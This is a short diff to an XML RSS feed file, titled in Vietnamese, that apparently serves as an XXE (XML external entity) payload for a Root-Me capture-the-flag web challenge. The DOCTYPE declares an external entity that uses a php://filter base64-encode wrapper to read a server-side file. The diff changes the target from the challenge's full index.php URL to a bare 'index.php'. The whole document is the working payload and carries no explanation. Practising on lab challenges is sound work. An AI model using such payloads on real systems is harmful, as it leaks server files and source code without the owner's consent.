@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="UTF-8" ?>
 <?xml version="1.0"?>
 <!DOCTYPE foo [
-<!ENTITY ac SYSTEM "php://filter/read=convert.base64-encode/resource=http://challenge01.root-me.org/web-serveur/ch29/index.php">]>
+<!ENTITY ac SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">]>
 <rss version="2.0">
   <channel>
     <title>Ví dụ RSS Feed</title>
@@ -24,6 +24,7 @@
     </item>
   </channel>
 </rss>
+
 
 
 
